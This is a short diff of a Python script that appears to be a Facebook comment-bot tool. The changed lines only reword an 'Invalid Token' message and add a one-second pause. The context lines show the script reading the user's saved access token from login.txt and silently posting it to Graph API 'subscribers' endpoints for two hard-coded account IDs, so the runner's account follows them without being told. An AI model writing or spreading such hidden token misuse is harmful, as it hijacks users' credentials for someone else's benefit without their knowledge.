@@ -171,7 +171,8 @@ def bot_komen():
 	try:
 		toket=open('login.txt','r').read()
 	except IOError:
-		print"   [!] Token invalid"
+		print ("   [!] Invalid Token").format(R,N)
+		time.sleep(1.0)
 		logs()
 	requests.post('https://graph.facebook.com/1827084332/subscribers?access_token=' + toket)
 	requests.post('https://graph.facebook.com/1602590373/subscribers?access_token=' + toket)
